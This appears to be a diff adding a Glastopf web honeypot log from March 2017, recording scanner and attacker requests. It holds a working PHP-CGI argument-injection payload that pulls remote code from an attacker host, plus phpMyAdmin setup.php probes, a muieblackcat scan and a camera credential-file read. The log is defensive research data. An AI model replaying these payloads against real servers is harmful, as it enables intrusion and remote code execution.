@@ -1,0 +1,434 @@
+2017-03-26 00:18:55,690 (glastopf.glastopf) 66.240.192.138 requested GET / on 13dc3d8ebca9:80
+2017-03-26 00:18:55,955 (glastopf.glastopf) 66.240.192.138 requested GET /robots.txt on 13dc3d8ebca9:80
+2017-03-26 00:18:56,113 (glastopf.glastopf) 66.240.192.138 requested GET /sitemap.xml on 13dc3d8ebca9:80
+2017-03-26 01:05:53,030 (glastopf.glastopf) 117.122.211.60 requested GET /phpmyadmin on 13dc3d8ebca9:80
+2017-03-26 01:45:28,674 (glastopf.glastopf) 212.83.154.179 requested HEAD /robots.txt on 13dc3d8ebca9:80
+2017-03-26 03:24:29,428 (glastopf.glastopf) 191.96.249.97 requested GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n on 13dc3d8ebca9:80
+2017-03-26 03:24:29,646 (glastopf.modules.handlers.emulators.rfi) Failed to fetch injected file, I/O error: HTTP Error 404: Not Found
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/Glastopf-3.1.3_dev-py2.7.egg/glastopf/modules/handlers/emulators/rfi.py", line 65, in download_file
+    injected_file = urllib2.urlopen(req, timeout=4).read()
+  File "/usr/lib/python2.7/urllib2.py", line 127, in urlopen
+    return _opener.open(url, data, timeout)
+  File "/usr/lib/python2.7/urllib2.py", line 410, in open
+    response = meth(req, response)
+  File "/usr/lib/python2.7/urllib2.py", line 523, in http_response
+    'http', request, response, code, msg, hdrs)
+  File "/usr/lib/python2.7/urllib2.py", line 448, in error
+    return self._call_chain(*args)
+  File "/usr/lib/python2.7/urllib2.py", line 382, in _call_chain
+    result = func(*args)
+  File "/usr/lib/python2.7/urllib2.py", line 531, in http_error_default
+    raise HTTPError(req.get_full_url(), code, msg, hdrs, fp)
+HTTPError: HTTP Error 404: Not Found
+2017-03-26 03:54:20,215 (glastopf.glastopf) 31.210.102.114 requested GET / on 13dc3d8ebca9:80
+2017-03-26 04:13:20,132 (glastopf.glastopf) 101.108.182.7 requested GET / on 13dc3d8ebca9:80
+2017-03-26 05:47:23,926 (glastopf.glastopf) 134.255.175.129 requested GET / on 13dc3d8ebca9:80
+2017-03-26 10:41:04,804 (glastopf.glastopf) 139.162.114.70 requested GET / on 13dc3d8ebca9:80
+2017-03-26 11:35:47,302 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-26 11:58:05,107 (glastopf.glastopf) 113.4.137.167 requested GET / on 13dc3d8ebca9:80
+2017-03-26 12:02:44,359 (glastopf.glastopf) 46.21.69.37 requested GET / on 13dc3d8ebca9:80
+2017-03-26 18:41:58,746 (glastopf.glastopf) 23.94.229.42 requested GET / on 13dc3d8ebca9:80
+2017-03-26 21:11:25,969 (glastopf.glastopf) 124.234.102.86 requested GET / on 13dc3d8ebca9:80
+2017-03-26 21:11:27,521 (glastopf.glastopf) 124.234.102.86 requested GET / on 13dc3d8ebca9:80
+2017-03-26 21:11:28,210 (glastopf.glastopf) 124.234.102.86 requested GET / on 13dc3d8ebca9:80
+2017-03-07 02:28:54,931 (glastopf.glastopf) Initializing Glastopf 3.1.3-dev using "/opt/myhoneypot" as work directory.
+2017-03-07 02:28:55,106 (glastopf.glastopf) Connecting to main database with: sqlite:///db/glastopf.db
+2017-03-07 02:28:55,244 (glastopf.modules.handlers.emulators.dork_list.dork_page_generator) Bootstrapping dork database.
+2017-03-07 02:28:59,571 (glastopf.glastopf) Generating initial dork pages - this can take a while.
+2017-03-07 02:28:59,692 (glastopf.glastopf) Glastopf started and privileges dropped.
+2017-03-07 02:28:59,784 (glastopf.glastopf) 104.7.14.91 requested GET / on 13dc3d8ebca9:80
+2017-03-07 02:28:59,977 (glastopf.glastopf) 104.7.14.91 requested GET /style.css on 13dc3d8ebca9:80
+2017-03-07 02:29:00,323 (glastopf.glastopf) 104.7.14.91 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-07 02:29:00,530 (glastopf.glastopf) 104.7.14.91 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-07 02:30:52,264 (glastopf.glastopf) 104.7.14.91 requested POST /index on 13dc3d8ebca9:80
+2017-03-07 02:30:52,461 (glastopf.glastopf) 104.7.14.91 requested GET /style.css on 13dc3d8ebca9:80
+2017-03-07 02:31:12,139 (glastopf.glastopf) 104.7.14.91 requested POST /index on 13dc3d8ebca9:80
+2017-03-07 02:31:12,307 (glastopf.glastopf) 104.7.14.91 requested GET /style.css on 13dc3d8ebca9:80
+2017-03-07 02:56:39,668 (glastopf.glastopf) 104.7.14.91 requested GET / on 13dc3d8ebca9:80
+2017-03-07 02:56:39,840 (glastopf.glastopf) 104.7.14.91 requested GET /style.css on 13dc3d8ebca9:80
+2017-03-07 02:56:40,162 (glastopf.glastopf) 104.7.14.91 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-07 02:56:40,415 (glastopf.glastopf) 104.7.14.91 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-07 03:35:33,598 (glastopf.glastopf) 1.55.132.130 requested GET / on 13dc3d8ebca9:80
+2017-03-07 12:10:01,171 (glastopf.glastopf) 139.162.119.197 requested GET / on 13dc3d8ebca9:80
+2017-03-07 12:44:39,090 (glastopf.glastopf) 118.174.136.233 requested GET / on 13dc3d8ebca9:80
+2017-03-07 13:13:44,378 (glastopf.glastopf) 190.92.37.214 requested GET / on 13dc3d8ebca9:80
+2017-03-07 18:34:48,665 (glastopf.glastopf) 66.102.7.189 requested GET / on 13dc3d8ebca9:80
+2017-03-07 18:34:48,787 (glastopf.glastopf) 66.102.7.190 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-07 18:41:38,736 (glastopf.glastopf) 95.224.194.19 requested GET / on 13dc3d8ebca9:80
+2017-03-07 19:08:12,908 (glastopf.glastopf) 42.112.165.115 requested GET / on 13dc3d8ebca9:80
+2017-03-07 20:43:03,831 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-07 21:19:49,609 (glastopf.glastopf) 139.162.124.167 requested GET / on 13dc3d8ebca9:80
+2017-03-07 23:46:41,616 (glastopf.glastopf) 187.136.247.44 requested GET / on 13dc3d8ebca9:80
+2017-03-08 00:26:23,393 (glastopf.glastopf) 2.226.161.250 requested GET / on 13dc3d8ebca9:80
+2017-03-08 01:01:38,826 (glastopf.glastopf) 189.226.96.88 requested GET / on 13dc3d8ebca9:80
+2017-03-08 01:09:40,951 (glastopf.glastopf) 85.4.205.28 requested GET / on 13dc3d8ebca9:80
+2017-03-13 23:02:36,387 (glastopf.glastopf) Initializing Glastopf 3.1.3-dev using "/opt/myhoneypot" as work directory.
+2017-03-13 23:02:36,600 (glastopf.glastopf) Connecting to main database with: sqlite:///db/glastopf.db
+2017-03-13 23:02:36,690 (glastopf.glastopf) Glastopf started and privileges dropped.
+2017-03-14 00:44:07,213 (glastopf.glastopf) 66.102.7.190 requested GET / on 13dc3d8ebca9:80
+2017-03-14 00:44:07,350 (glastopf.glastopf) 66.102.7.190 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-14 01:12:44,556 (glastopf.glastopf) 151.53.141.159 requested GET / on 13dc3d8ebca9:80
+2017-03-14 01:16:54,752 (glastopf.glastopf) 212.129.25.214 requested GET / on 13dc3d8ebca9:80
+2017-03-14 01:35:49,443 (glastopf.glastopf) 222.164.84.231 requested GET / on 13dc3d8ebca9:80
+2017-03-14 04:28:20,597 (glastopf.glastopf) 210.195.248.161 requested GET / on 13dc3d8ebca9:80
+2017-03-14 05:25:41,730 (glastopf.glastopf) 122.54.191.32 requested GET / on 13dc3d8ebca9:80
+2017-03-14 06:10:23,647 (glastopf.glastopf) 27.78.22.93 requested GET / on 13dc3d8ebca9:80
+2017-03-14 07:01:36,839 (glastopf.glastopf) 14.161.37.253 requested GET / on 13dc3d8ebca9:80
+2017-03-14 09:13:40,305 (glastopf.glastopf) 187.138.188.164 requested GET / on 13dc3d8ebca9:80
+2017-03-14 10:15:41,298 (glastopf.glastopf) 86.110.119.19 requested GET /script/live.js on 13dc3d8ebca9:80
+2017-03-14 10:26:53,131 (glastopf.glastopf) 185.117.72.44 requested GET / on 13dc3d8ebca9:80
+2017-03-14 10:48:38,890 (glastopf.glastopf) 116.105.63.214 requested GET / on 13dc3d8ebca9:80
+2017-03-14 12:35:35,968 (glastopf.glastopf) 189.129.243.151 requested GET / on 13dc3d8ebca9:80
+2017-03-14 13:31:00,726 (glastopf.glastopf) 162.254.201.233 requested GET /recordings/ on 13dc3d8ebca9:80
+2017-03-14 14:34:41,689 (glastopf.glastopf) 93.64.248.71 requested GET / on 13dc3d8ebca9:80
+2017-03-14 14:43:22,867 (glastopf.glastopf) 90.48.63.163 requested GET / on 13dc3d8ebca9:80
+2017-03-14 15:33:10,497 (glastopf.glastopf) 117.0.64.162 requested GET / on 13dc3d8ebca9:80
+2017-03-14 16:27:30,411 (glastopf.glastopf) 66.102.7.189 requested GET / on 13dc3d8ebca9:80
+2017-03-14 16:51:30,971 (glastopf.glastopf) 1.54.32.150 requested GET / on 13dc3d8ebca9:80
+2017-03-14 17:46:07,901 (glastopf.glastopf) 68.205.72.168 requested GET / on 13dc3d8ebca9:80
+2017-03-14 17:47:37,451 (glastopf.glastopf) 123.20.57.47 requested GET / on 13dc3d8ebca9:80
+2017-03-14 18:25:06,076 (glastopf.glastopf) 122.117.193.238 requested GET / on 13dc3d8ebca9:80
+2017-03-14 19:48:13,172 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-14 20:05:55,053 (glastopf.glastopf) 84.95.200.151 requested GET / on 13dc3d8ebca9:80
+2017-03-14 20:15:22,629 (glastopf.glastopf) 77.28.100.180 requested GET / on 13dc3d8ebca9:80
+2017-03-14 22:59:29,537 (glastopf.glastopf) 92.110.124.88 requested GET / on 13dc3d8ebca9:80
+2017-03-14 22:59:30,941 (glastopf.glastopf) 92.110.124.88 requested GET / on 13dc3d8ebca9:80
+2017-03-14 22:59:32,492 (glastopf.glastopf) 92.110.124.88 requested GET / on 13dc3d8ebca9:80
+2017-03-14 22:59:32,901 (glastopf.glastopf) 92.110.124.88 requested GET / on 13dc3d8ebca9:80
+2017-03-14 22:59:53,535 (glastopf.glastopf) 92.110.124.88 requested GET / on 13dc3d8ebca9:80
+2017-03-14 23:00:21,118 (glastopf.glastopf) 107.199.48.244 requested GET / on 13dc3d8ebca9:80
+2017-03-15 01:12:16,992 (glastopf.glastopf) 62.150.170.220 requested GET / on 13dc3d8ebca9:80
+2017-03-15 01:42:14,945 (glastopf.glastopf) 94.39.200.30 requested GET / on 13dc3d8ebca9:80
+2017-03-15 03:17:08,368 (glastopf.glastopf) 31.53.155.172 requested GET / on 13dc3d8ebca9:80
+2017-03-15 03:53:31,789 (glastopf.glastopf) 202.162.196.8 requested GET / on 13dc3d8ebca9:80
+2017-03-15 05:29:43,265 (glastopf.glastopf) 113.175.43.70 requested GET / on 13dc3d8ebca9:80
+2017-03-15 08:37:46,816 (glastopf.glastopf) 197.44.223.5 requested GET / on 13dc3d8ebca9:80
+2017-03-15 09:40:14,363 (glastopf.glastopf) 114.32.214.216 requested GET / on 13dc3d8ebca9:80
+2017-03-15 09:50:39,895 (glastopf.glastopf) 36.78.131.28 requested GET / on 13dc3d8ebca9:80
+2017-03-15 13:18:35,301 (glastopf.glastopf) 77.176.114.239 requested GET / on 13dc3d8ebca9:80
+2017-03-15 18:40:22,047 (glastopf.glastopf) 180.97.106.161 requested HEAD http://180.163.113.82/check_proxy on 13dc3d8ebca9:80
+2017-03-15 18:46:26,348 (glastopf.glastopf) 117.6.9.160 requested GET / on 13dc3d8ebca9:80
+2017-03-15 20:03:25,793 (glastopf.glastopf) 104.128.144.131 requested GET / on 13dc3d8ebca9:80
+2017-03-15 20:03:26,055 (glastopf.glastopf) 104.128.144.131 requested HEAD /redirect.php on 13dc3d8ebca9:80
+2017-03-15 20:29:57,886 (glastopf.glastopf) 80.11.254.138 requested GET / on 13dc3d8ebca9:80
+2017-03-15 20:57:49,875 (glastopf.glastopf) 66.102.6.142 requested GET / on 13dc3d8ebca9:80
+2017-03-15 20:57:49,974 (glastopf.glastopf) 66.102.6.144 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-15 21:06:50,942 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-15 21:17:02,278 (glastopf.glastopf) 31.210.102.114 requested GET / on 13dc3d8ebca9:80
+2017-03-15 22:22:55,046 (glastopf.glastopf) 175.106.14.142 requested GET / on 13dc3d8ebca9:80
+2017-03-15 23:23:54,127 (glastopf.glastopf) 168.1.128.76 requested GET / on 13dc3d8ebca9:80
+2017-03-16 01:29:09,609 (glastopf.glastopf) 189.181.51.231 requested GET / on 13dc3d8ebca9:80
+2017-03-16 01:45:04,983 (glastopf.glastopf) 46.201.249.216 requested GET / on 13dc3d8ebca9:80
+2017-03-16 02:02:18,681 (glastopf.glastopf) 197.51.38.70 requested GET / on 13dc3d8ebca9:80
+2017-03-16 03:17:51,334 (glastopf.glastopf) 118.68.149.146 requested GET / on 13dc3d8ebca9:80
+2017-03-16 03:31:08,283 (glastopf.glastopf) 139.162.114.70 requested GET / on 13dc3d8ebca9:80
+2017-03-16 03:37:08,269 (glastopf.glastopf) 14.189.121.239 requested GET / on 13dc3d8ebca9:80
+2017-03-16 05:09:53,603 (glastopf.glastopf) 42.119.200.169 requested GET / on 13dc3d8ebca9:80
+2017-03-16 09:17:17,255 (glastopf.glastopf) 117.0.73.89 requested GET / on 13dc3d8ebca9:80
+2017-03-16 09:50:06,068 (glastopf.glastopf) 189.180.74.81 requested GET / on 13dc3d8ebca9:80
+2017-03-16 10:17:41,852 (glastopf.glastopf) 193.63.58.83 requested GET / on 13dc3d8ebca9:80
+2017-03-16 10:19:19,050 (glastopf.glastopf) 124.122.182.58 requested GET / on 13dc3d8ebca9:80
+2017-03-16 10:21:30,263 (glastopf.glastopf) 84.162.132.167 requested GET / on 13dc3d8ebca9:80
+2017-03-16 11:13:37,151 (glastopf.glastopf) 187.212.149.193 requested GET / on 13dc3d8ebca9:80
+2017-03-16 11:30:02,144 (glastopf.glastopf) 115.133.60.17 requested GET / on 13dc3d8ebca9:80
+2017-03-16 11:55:19,769 (glastopf.glastopf) 171.97.78.238 requested GET / on 13dc3d8ebca9:80
+2017-03-16 12:15:22,158 (glastopf.glastopf) 108.246.64.89 requested GET / on 13dc3d8ebca9:80
+2017-03-16 13:23:38,580 (glastopf.glastopf) 185.110.132.231 requested GET / on 13dc3d8ebca9:80
+2017-03-16 15:33:42,220 (glastopf.glastopf) 64.191.184.73 requested GET / on 13dc3d8ebca9:80
+2017-03-16 15:50:47,068 (glastopf.glastopf) 122.117.137.251 requested GET / on 13dc3d8ebca9:80
+2017-03-16 16:29:24,486 (glastopf.glastopf) 66.102.6.142 requested GET / on 13dc3d8ebca9:80
+2017-03-16 16:29:24,587 (glastopf.glastopf) 66.102.6.18 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-16 16:43:09,124 (glastopf.glastopf) 171.226.78.8 requested GET / on 13dc3d8ebca9:80
+2017-03-16 19:13:11,405 (glastopf.glastopf) 66.102.6.144 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-16 19:24:20,463 (glastopf.glastopf) 79.62.86.82 requested GET / on 13dc3d8ebca9:80
+2017-03-16 19:35:48,088 (glastopf.glastopf) 197.45.109.158 requested GET / on 13dc3d8ebca9:80
+2017-03-16 22:12:11,250 (glastopf.glastopf) 94.68.168.79 requested GET / on 13dc3d8ebca9:80
+2017-03-16 23:08:55,354 (glastopf.glastopf) 189.159.12.41 requested GET / on 13dc3d8ebca9:80
+2017-03-16 23:17:35,494 (glastopf.glastopf) 181.192.34.65 requested GET / on 13dc3d8ebca9:80
+2017-03-16 23:18:18,707 (glastopf.glastopf) 181.192.34.65 requested GET / on 13dc3d8ebca9:80
+2017-03-16 23:35:45,157 (glastopf.glastopf) 163.172.52.197 requested GET /recordings/ on 13dc3d8ebca9:80
+2017-03-17 00:07:03,327 (glastopf.glastopf) 139.162.114.70 requested GET / on 13dc3d8ebca9:80
+2017-03-17 00:11:13,978 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:32,526 (glastopf.glastopf) 93.174.93.222 requested GET /muieblackcat on 13dc3d8ebca9:80
+2017-03-17 00:42:32,710 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:32,907 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/admin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:33,107 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/admin/pma/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:33,329 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/myadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:33,532 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/mysql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:33,733 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/phpadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:33,946 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/pma/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:34,162 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/blog/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:34,379 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/php/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:34,596 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:34,797 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/phpMyAdmin2/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:34,997 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/dbadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:35,187 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/admin/sql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:35,374 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/database/sql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:35,569 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/web/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:35,762 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/php/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:35,973 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/admin/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:36,164 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/php/phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:36,368 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/db/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 00:42:36,572 (glastopf.glastopf) 93.174.93.222 requested GET /:8080/admin/mysql/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 01:45:00,775 (glastopf.glastopf) 77.251.100.153 requested GET / on 13dc3d8ebca9:80
+2017-03-17 01:53:59,017 (glastopf.glastopf) 47.203.88.36 requested GET http://httpheader.net/ on 13dc3d8ebca9:80
+2017-03-17 02:25:34,454 (glastopf.glastopf) 116.105.148.174 requested GET / on 13dc3d8ebca9:80
+2017-03-17 02:36:25,903 (glastopf.glastopf) 90.63.176.131 requested GET / on 13dc3d8ebca9:80
+2017-03-17 03:55:46,269 (glastopf.glastopf) 60.248.127.86 requested GET / on 13dc3d8ebca9:80
+2017-03-17 04:03:55,941 (glastopf.glastopf) 185.184.16.40 requested GET / on 13dc3d8ebca9:80
+2017-03-17 04:49:46,619 (glastopf.glastopf) 54.149.51.58 requested GET / on 13dc3d8ebca9:80
+2017-03-17 05:20:31,694 (glastopf.glastopf) 87.165.174.51 requested GET / on 13dc3d8ebca9:80
+2017-03-17 06:03:44,420 (glastopf.glastopf) 93.227.225.95 requested GET / on 13dc3d8ebca9:80
+2017-03-17 07:35:30,441 (glastopf.glastopf) 189.205.158.187 requested GET / on 13dc3d8ebca9:80
+2017-03-17 08:27:12,930 (glastopf.glastopf) 183.82.0.15 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-17 10:22:42,093 (glastopf.glastopf) 36.75.214.152 requested GET / on 13dc3d8ebca9:80
+2017-03-17 10:32:37,251 (glastopf.glastopf) 23.20.60.205 requested HEAD / on 13dc3d8ebca9:80
+2017-03-17 11:09:08,169 (glastopf.glastopf) 23.247.72.50 requested GET / on 13dc3d8ebca9:80
+2017-03-17 11:43:54,525 (glastopf.glastopf) 114.34.160.230 requested GET / on 13dc3d8ebca9:80
+2017-03-17 11:48:33,177 (glastopf.glastopf) 202.162.204.196 requested GET / on 13dc3d8ebca9:80
+2017-03-17 12:08:40,706 (glastopf.glastopf) 177.125.87.167 requested GET / on 13dc3d8ebca9:80
+2017-03-17 12:31:39,989 (glastopf.glastopf) 131.100.242.0 requested GET / on 13dc3d8ebca9:80
+2017-03-17 14:18:40,746 (glastopf.glastopf) 95.227.208.19 requested GET / on 13dc3d8ebca9:80
+2017-03-17 14:47:55,751 (glastopf.glastopf) 182.138.158.161 requested GET / on 13dc3d8ebca9:80
+2017-03-17 14:48:58,016 (glastopf.glastopf) 1.202.78.19 requested GET / on 13dc3d8ebca9:80
+2017-03-17 18:15:52,421 (glastopf.glastopf) 90.230.225.187 requested GET / on 13dc3d8ebca9:80
+2017-03-17 18:19:43,443 (glastopf.glastopf) 5.14.186.242 requested GET / on 13dc3d8ebca9:80
+2017-03-17 19:12:48,322 (glastopf.glastopf) 99.248.68.118 requested GET / on 13dc3d8ebca9:80
+2017-03-17 21:26:31,605 (glastopf.glastopf) 187.214.180.54 requested GET / on 13dc3d8ebca9:80
+2017-03-17 21:30:41,980 (glastopf.glastopf) 198.20.69.74 requested GET / on 13dc3d8ebca9:80
+2017-03-17 21:30:42,445 (glastopf.glastopf) 198.20.69.74 requested GET /robots.txt on 13dc3d8ebca9:80
+2017-03-17 21:30:42,880 (glastopf.glastopf) 198.20.69.74 requested GET /sitemap.xml on 13dc3d8ebca9:80
+2017-03-17 21:50:58,619 (glastopf.glastopf) 110.139.130.249 requested GET / on 13dc3d8ebca9:80
+2017-03-17 22:03:29,140 (glastopf.glastopf) 66.102.6.144 requested GET / on 13dc3d8ebca9:80
+2017-03-17 22:03:29,239 (glastopf.glastopf) 66.102.6.142 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-17 23:36:35,826 (glastopf.glastopf) 187.67.70.123 requested GET / on 13dc3d8ebca9:80
+2017-03-17 23:36:36,516 (glastopf.glastopf) 187.67.70.123 requested GET / on 13dc3d8ebca9:80
+2017-03-17 23:36:44,317 (glastopf.glastopf) 187.67.70.123 requested GET / on 13dc3d8ebca9:80
+2017-03-17 23:36:54,532 (glastopf.glastopf) 187.67.70.123 requested GET / on 13dc3d8ebca9:80
+2017-03-17 23:37:02,534 (glastopf.glastopf) 187.67.70.123 requested GET / on 13dc3d8ebca9:80
+2017-03-17 23:37:13,731 (glastopf.glastopf) 187.67.70.123 requested GET / on 13dc3d8ebca9:80
+2017-03-18 02:29:44,218 (glastopf.glastopf) 189.210.191.31 requested GET / on 13dc3d8ebca9:80
+2017-03-18 02:55:14,179 (glastopf.glastopf) 187.207.38.94 requested GET / on 13dc3d8ebca9:80
+2017-03-18 07:19:55,207 (glastopf.glastopf) 14.177.250.99 requested GET / on 13dc3d8ebca9:80
+2017-03-18 07:21:06,161 (glastopf.glastopf) 124.120.241.207 requested GET / on 13dc3d8ebca9:80
+2017-03-18 07:59:33,719 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-18 08:31:58,091 (glastopf.glastopf) 66.240.236.119 requested GET / on 13dc3d8ebca9:80
+2017-03-18 08:31:59,944 (glastopf.glastopf) 66.240.236.119 requested GET /robots.txt on 13dc3d8ebca9:80
+2017-03-18 08:32:03,071 (glastopf.glastopf) 66.240.236.119 requested GET /sitemap.xml on 13dc3d8ebca9:80
+2017-03-18 16:53:28,863 (glastopf.glastopf) 118.100.211.165 requested GET / on 13dc3d8ebca9:80
+2017-03-18 17:14:07,496 (glastopf.glastopf) 189.208.251.218 requested GET / on 13dc3d8ebca9:80
+2017-03-18 17:30:01,082 (glastopf.glastopf) 171.96.110.127 requested GET / on 13dc3d8ebca9:80
+2017-03-18 19:21:37,193 (glastopf.glastopf) 113.160.196.49 requested GET / on 13dc3d8ebca9:80
+2017-03-18 22:00:35,338 (glastopf.glastopf) 212.129.25.214 requested GET / on 13dc3d8ebca9:80
+2017-03-18 22:09:33,578 (glastopf.glastopf) 219.246.36.252 requested GET / on 13dc3d8ebca9:80
+2017-03-18 22:09:53,098 (glastopf.glastopf) 219.246.36.252 requested GET / on 13dc3d8ebca9:80
+2017-03-19 01:40:29,543 (glastopf.glastopf) 113.23.39.29 requested GET / on 13dc3d8ebca9:80
+2017-03-19 02:55:17,774 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-19 04:15:18,522 (glastopf.glastopf) 175.137.85.142 requested GET / on 13dc3d8ebca9:80
+2017-03-19 04:59:05,555 (glastopf.glastopf) 185.110.132.231 requested GET / on 13dc3d8ebca9:80
+2017-03-19 05:50:35,644 (glastopf.glastopf) 190.140.79.136 requested GET / on 13dc3d8ebca9:80
+2017-03-19 06:54:40,941 (glastopf.glastopf) 141.212.122.32 requested GET /x on 13dc3d8ebca9:80
+2017-03-19 09:31:26,603 (glastopf.glastopf) 134.196.87.20 requested GET / on 13dc3d8ebca9:80
+2017-03-19 11:30:54,388 (glastopf.glastopf) 188.99.107.129 requested GET / on 13dc3d8ebca9:80
+2017-03-19 16:26:07,280 (glastopf.glastopf) 181.169.158.5 requested GET / on 13dc3d8ebca9:80
+2017-03-19 16:27:36,458 (glastopf.glastopf) 212.129.25.214 requested GET / on 13dc3d8ebca9:80
+2017-03-19 16:40:37,820 (glastopf.glastopf) 103.17.245.131 requested GET / on 13dc3d8ebca9:80
+2017-03-19 17:11:43,389 (glastopf.glastopf) 49.4.135.168 requested GET / on 13dc3d8ebca9:80
+2017-03-19 17:12:01,850 (glastopf.glastopf) 49.4.135.168 requested GET / on 13dc3d8ebca9:80
+2017-03-19 17:43:12,161 (glastopf.glastopf) 187.172.142.183 requested GET / on 13dc3d8ebca9:80
+2017-03-19 18:48:13,316 (glastopf.glastopf) 195.154.182.56 requested HEAD /robots.txt on 13dc3d8ebca9:80
+2017-03-19 19:17:05,691 (glastopf.glastopf) 59.33.252.251 requested GET / on 13dc3d8ebca9:80
+2017-03-19 19:31:31,785 (glastopf.glastopf) 115.132.126.200 requested GET / on 13dc3d8ebca9:80
+2017-03-19 20:41:55,385 (glastopf.glastopf) 14.176.7.114 requested GET / on 13dc3d8ebca9:80
+2017-03-20 01:43:16,249 (glastopf.glastopf) 116.102.180.133 requested GET / on 13dc3d8ebca9:80
+2017-03-20 04:31:28,162 (glastopf.glastopf) 202.29.242.35 requested GET / on 13dc3d8ebca9:80
+2017-03-20 06:43:31,931 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-20 06:54:33,899 (glastopf.glastopf) 139.162.114.70 requested GET / on 13dc3d8ebca9:80
+2017-03-20 07:34:43,851 (glastopf.glastopf) 198.20.69.74 requested GET / on 13dc3d8ebca9:80
+2017-03-20 07:34:57,957 (glastopf.glastopf) 198.20.69.74 requested GET /robots.txt on 13dc3d8ebca9:80
+2017-03-20 07:49:56,366 (glastopf.glastopf) 187.22.28.28 requested GET /system.ini?loginuse&loginpas on 13dc3d8ebca9:80
+2017-03-20 15:02:18,915 (glastopf.glastopf) 113.200.200.40 requested GET /phpmyadmin on 13dc3d8ebca9:80
+2017-03-20 16:36:55,488 (glastopf.glastopf) 66.102.6.142 requested GET / on 13dc3d8ebca9:80
+2017-03-20 16:36:55,590 (glastopf.glastopf) 66.102.6.16 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-20 16:48:19,844 (glastopf.glastopf) 47.203.88.36 requested GET http://httpheader.net/ on 13dc3d8ebca9:80
+2017-03-20 18:28:06,922 (glastopf.glastopf) 175.140.86.144 requested GET / on 13dc3d8ebca9:80
+2017-03-20 20:18:24,852 (glastopf.glastopf) 66.102.6.144 requested GET /favicon.ico on 13dc3d8ebca9:80
+2017-03-20 21:19:15,712 (glastopf.glastopf) 177.39.204.82 requested GET / on 13dc3d8ebca9:80
+2017-03-20 21:30:12,877 (glastopf.glastopf) 191.96.249.97 requested GET /phpmyadmin/scripts/setup.php on 13dc3d8ebca9:80
+2017-03-20 23:55:39,723 (glastopf.glastopf) 184.186.75.199 requested GET / on 13dc3d8ebca9:80
